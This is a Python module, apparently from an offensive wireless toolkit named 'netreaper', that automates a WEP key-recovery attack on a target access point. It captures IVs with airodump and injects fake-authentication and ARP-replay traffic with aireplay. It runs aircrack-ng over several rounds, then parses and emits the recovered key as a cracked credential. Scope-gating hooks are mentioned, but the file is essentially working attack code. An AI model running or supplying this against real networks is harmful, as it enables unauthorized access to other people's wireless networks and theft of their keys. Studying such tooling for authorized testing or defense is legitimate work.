# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""WEP key recovery: IV collection, traffic injection, and aircrack-ng.

WEP is broken by collecting enough weak initialisation vectors and running the
statistical/PTW attack over them. This orchestrates the gated adapters, a
channel-locked airodump capture to collect IVs, plus fake authentication and ARP
replay (aireplay) to generate traffic and accelerate collection, then runs
aircrack-ng over the capture to recover the key.

The capture and injection spawn through the gated adapters (PASSIVE capture,
DESTRUCTIVE injection). aircrack-ng reads a local file and touches no network, so
it runs at PASSIVE tier with no target. A scope-gate denial propagates.
"""
from __future__ import annotations

import asyncio
import contextlib
import re
import shutil
import tempfile
from dataclasses import dataclass
from pathlib import Path

from netreaper.core.exceptions import SubprocessError, ToolNotFoundError
from netreaper.core.logging import get_logger
from netreaper.core.process import ProcessRunner, get_process_runner
from netreaper.orchestration.events import Events, event_bus
from netreaper.safety.scope import Tier
from netreaper.tools.aireplay import AireplayTool
from netreaper.tools.airodump import AirodumpTool

logger = get_logger(__name__)

_KEY_RE = re.compile(r"KEY FOUND!\s*\[\s*([0-9A-Fa-f: ]+?)\s*\]")


def parse_aircrack_key(output: str) -> str | None:
    """Return the recovered WEP key (hex, no separators) from aircrack output."""
    match = _KEY_RE.search(output)
    if not match:
        return None
    hexkey = match.group(1).replace(":", "").replace(" ", "").lower()
    return hexkey or None


async def crack_capture(
    cap_path: str | Path,
    bssid: str | None = None,
    *,
    runner: ProcessRunner | None = None,
    timeout: float = 120.0,
) -> str | None:
    """Run aircrack-ng over a capture and return the WEP key, or None.

    aircrack-ng reads a local file and makes no network contact, so it runs at
    PASSIVE tier with no target. Missing tool or timeout yields None.
    """
    runner = runner or get_process_runner()
    cmd = ["aircrack-ng", "-a", "1"]
    if bssid:
        cmd += ["-b", bssid]
    cmd.append(str(cap_path))
    try:
        result = await runner.run(cmd, tier=Tier.PASSIVE, timeout=timeout)
    except (SubprocessError, ToolNotFoundError):
        return None
    return parse_aircrack_key(result.stdout + (result.stderr or ""))


@dataclass
class WepResult:
    bssid: str
    channel: int
    cracked: bool = False
    key: str | None = None
    cap_file: str | None = None
    rounds: int = 0


class WepAttack:
    """Collect IVs with injection, then recover the WEP key with aircrack-ng."""

    def __init__(
        self,
        airodump: AirodumpTool | None = None,
        aireplay: AireplayTool | None = None,
        cracker=crack_capture,
    ) -> None:
        self._airodump = airodump or AirodumpTool()
        self._aireplay = aireplay or AireplayTool()
        self._cracker = cracker

    async def run(
        self,
        interface: str,
        bssid: str,
        channel: int,
        *,
        essid: str = "",
        source_mac: str | None = None,
        output: str | None = None,
        capture_seconds: int = 30,
        max_rounds: int = 5,
        use_arpreplay: bool = True,
        settle_seconds: int = 3,
    ) -> WepResult:
        """Capture IVs (injection-assisted) and crack, retrying up to max_rounds.

        Args:
            interface: Monitor-mode interface.
            bssid: Target access point BSSID (the scope-checked identifier).
            channel: Target channel.
            essid: Network name (needed for fake authentication).
            source_mac: Attacker MAC for fakeauth/arpreplay; None skips injection.
            output: .cap prefix; a temp file is used when omitted.
            capture_seconds: IV-collection window per round.
            max_rounds: Capture+crack rounds before giving up.
            use_arpreplay: Run ARP replay to speed up IV collection.
            settle_seconds: Delay before injecting so airodump is on-channel.
        """
        prefix, cleanup = self._resolve_prefix(output)
        result = WepResult(bssid=bssid, channel=channel)
        try:
            for attempt in range(1, max_rounds + 1):
                result.rounds = attempt
                cap_path = await self._one_round(
                    interface, bssid, channel, essid, source_mac, prefix,
                    capture_seconds, use_arpreplay, settle_seconds,
                )
                key = await self._cracker(cap_path, bssid)
                if key:
                    result.cracked = True
                    result.key = key
                    result.cap_file = str(cap_path)
                    event_bus.emit(
                        Events.CREDENTIAL_CRACKED,
                        {"type": "wep", "bssid": bssid, "password": key},
                    )
                    logger.info("WEP key recovered for %s (round %d)", bssid, attempt)
                    return result
                logger.info("No WEP key yet for %s (%d/%d)", bssid, attempt, max_rounds)
            return result
        finally:
            cleanup()

    async def _one_round(
        self,
        interface: str,
        bssid: str,
        channel: int,
        essid: str,
        source_mac: str | None,
        prefix: str,
        capture_seconds: int,
        use_arpreplay: bool,
        settle_seconds: int,
    ) -> Path:
        """Capture IVs while injecting ARP traffic. Returns the cap path."""
        cap_task = asyncio.create_task(
            self._airodump.capture_for_target(
                interface, bssid, channel, prefix, duration=capture_seconds
            )
        )
        replay_task: asyncio.Task | None = None
        try:
            if source_mac:
                await asyncio.sleep(min(settle_seconds, max(0, capture_seconds - 1)))
                await self._aireplay.fakeauth_attack(
                    interface, bssid, source_mac, essid
                )
                if use_arpreplay:
                    replay_task = asyncio.create_task(
                        self._aireplay.arpreplay_attack(interface, bssid, source_mac)
                    )
            await cap_task
        except BaseException:
            # A scope-gate denial (TargetValidationError) propagates unchanged.
            cap_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await cap_task
            raise
        finally:
            # ARP replay is best-effort acceleration; tear it down and ignore its
            # cancellation or tool errors (a gate denial for this BSSID would have
            # already surfaced from the awaited fakeauth above).
            if replay_task is not None:
                replay_task.cancel()
                with contextlib.suppress(
                    asyncio.CancelledError, SubprocessError, ToolNotFoundError
                ):
                    await replay_task
        return Path(f"{prefix}-01.cap")

    @staticmethod
    def _resolve_prefix(output: str | None):
        """Return (prefix, cleanup). A temp dir is created when output is None."""
        if output:
            return output, lambda: None
        tmp = tempfile.mkdtemp(prefix="netreaper_wep_")
        prefix = str(Path(tmp) / "wep")

        def cleanup() -> None:
            shutil.rmtree(tmp, ignore_errors=True)

        return prefix, cleanup


async def crack_wep(
    interface: str,
    bssid: str,
    channel: int,
    *,
    essid: str = "",
    source_mac: str | None = None,
    output: str | None = None,
    capture_seconds: int = 30,
    max_rounds: int = 5,
) -> WepResult:
    """Stateless one-shot WEP attack for the CLI."""
    return await WepAttack().run(
        interface,
        bssid,
        channel,
        essid=essid,
        source_mac=source_mac,
        output=output,
        capture_seconds=capture_seconds,
        max_rounds=max_rounds,
    )
